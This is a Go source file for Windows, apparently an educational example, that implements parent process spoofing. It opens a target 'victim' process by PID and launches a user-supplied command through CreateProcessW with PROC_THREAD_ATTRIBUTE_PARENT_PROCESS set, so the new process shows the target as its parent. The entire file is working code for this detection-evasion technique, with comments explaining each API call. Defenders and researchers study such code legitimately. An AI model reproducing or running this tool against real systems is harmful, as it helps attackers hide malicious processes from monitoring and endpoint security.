// +build windows
// ONLY build for Windows platforms
//
// Windows parent process spoofing Golang code example.
//
// Once compiled, use the command line to target a process by PID and which command to run.
package main

import (
	"fmt"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

// This is out STARTUPINFOEX struct
type STARTUPINFOEX struct {
	StartupInfo   windows.StartupInfo
	AttributeList *LPPROC_THREAD_ATTRIBUTE_LIST
}

// This is our opaque LPPROC_THREAD_ATTRIBUTE_LIST struct
// This is used to allocate 48 bytes of memory easily (8*6 = 48)
type LPPROC_THREAD_ATTRIBUTE_LIST struct {
	_, _, _, _, _, _ uint64
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "%s <pid> <command>", os.Args[0])
		os.Exit(1)
	}

	// Security attributes that are needed to spoof parent processes
	const requestRights = windows.PROCESS_TERMINATE | windows.SYNCHRONIZE | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_CREATE_PROCESS | windows.PROCESS_SUSPEND_RESUME | windows.PROCESS_DUP_HANDLE

	var (
		// Command we are going to run.
		// Taken from command line.
		command = os.Args[2] // "cmd.exe /c echo Hello-There & ping 127.0.0.1"

		// Victim process ID
		// Taken from command line.
		targetPID, _ = strconv.Atoi(os.Args[1])

		// Link and load kernel32.dll
		// kernel32.dll contains the functions we need.
		dllKernel32 = windows.NewLazySystemDLL("kernel32.dll")

		// Load the functions from kernel32.dll that we need by name.
		funcCreateProcess                     = dllKernel32.NewProc("CreateProcessW")
		funcUpdateProcThreadAttribute         = dllKernel32.NewProc("UpdateProcThreadAttribute")
		funcInitializeProcThreadAttributeList = dllKernel32.NewProc("InitializeProcThreadAttributeList")
	)

	// Get HANDLE to the target process
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	//
	targetHandle, err := windows.OpenProcess(
		requestRights,     // Security Access rights
		true,              // Inherit Handles
		uint32(targetPID), // Target Process ID
	)

	if err != nil {
		panic("OpenProcess failed: " + err.Error())
	}

	// Declare some variables to create the StartupInfoEx struct
	var (
		size                uint64
		startupInfoExtended STARTUPINFOEX
	)

	// This function ALWAYS returns an error. The only way to detect a failure is to determine
	// if the size is lower than the smallest allocation size (48 bytes).
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	funcInitializeProcThreadAttributeList.Call(
		0,                              // Initial should be NULL
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory to reserve
	)

	if size < 48 {
		panic("InitializeProcThreadAttributeList returned invalid size!")
	}

	// Allocate the memory space for the opaque struct
	startupInfoExtended.AttributeList = new(LPPROC_THREAD_ATTRIBUTE_LIST)

	// Actually allocate the memory required for the LPPROC_THREAD_ATTRIBUTE_LIST blob.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	r, _, err := funcInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory that was written
	)

	if r == 0 {
		panic("InitializeProcThreadAttributeList failed: " + err.Error())
	}

	// Update the LPPROC_THREAD_ATTRIBUTE_LIST blob with the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
	//
	r, _, err = funcUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		0,                                      // Reserved, must be zero
		0x00020000,                             // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS constant
		uintptr(unsafe.Pointer(&targetHandle)), // Pointer to HANDLE of the target process
		uintptr(unsafe.Sizeof(targetHandle)),   // Size of the HANDLE
		uintptr(unsafe.Pointer(nil)),           // Pointer to previous value, we can ignore it
		uintptr(unsafe.Pointer(nil)),           // Pointer the size to previous value, we can ignore it
	)

	if r == 0 {
		panic("UpdateProcThreadAttribute failed: " + err.Error())
	}

	// Set STARTUPINFO size to match the extended size
	startupInfoExtended.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoExtended))

	// Convert string to UTF16 Pointer
	commandPtr, err := windows.UTF16PtrFromString(command)

	if err != nil {
		panic("cannot convert command: " + err.Error())
	}

	// Declare a variable to store our resulting process info
	var procInfo windows.ProcessInformation

	// Create and start the process with out new STARTUPINFOEX struct.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
	//
	// The CREATE_NEW_CONSOLE flag is REQUIRED when attempting to spoof a parent process as the parent may not have
	// an allocated coonsole for useage, which would cause the process to crash if it requires one.
	r, _, err = funcCreateProcess.Call(
		uintptr(unsafe.Pointer(nil)),                   // Application name pointer, can be NULL
		uintptr(unsafe.Pointer(commandPtr)),            // Command line pointer
		uintptr(unsafe.Pointer(nil)),                   // Process SECURITY_ATTRIBUTES, can be NULL
		uintptr(unsafe.Pointer(nil)),                   // Thread SECURITY_ATTRIBUTES, can be NULL
		uintptr(1),                                     // Inherit Handles, set to true
		uintptr(0x00080000|windows.CREATE_NEW_CONSOLE), // Process creation flags, the EXTENDED_STARTUPINFO_PRESENT (0x00080000) flag is required
		uintptr(unsafe.Pointer(nil)),                   // Environment Block, can be NULL
		uintptr(unsafe.Pointer(nil)),                   // Current working directory, can be NULL
		uintptr(unsafe.Pointer(&startupInfoExtended)),  // Pointer to our STARTUPINFOEX struct
		uintptr(unsafe.Pointer(&procInfo)),             // Pointer to our PROCESS_INFORMATION struct
	)

	if r == 0 {
		panic("CreateProcess failed: " + err.Error())
	}

	// Print out new process info!
	fmt.Printf("Process Created!\nPID: %d\n", procInfo.ProcessId)

	// Wait for process to complete
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
	//
	waitResult, err := windows.WaitForSingleObject(
		procInfo.Process, // HANDLE to created process
		windows.INFINITE, // Timeout value (currently infinite)
	)

	if waitResult != windows.WAIT_OBJECT_0 {
		panic("WaitForSingleObject failed: " + err.Error())
	}

	// Release Resources
	windows.CloseHandle(targetHandle)

	fmt.Println("Process complete!")
}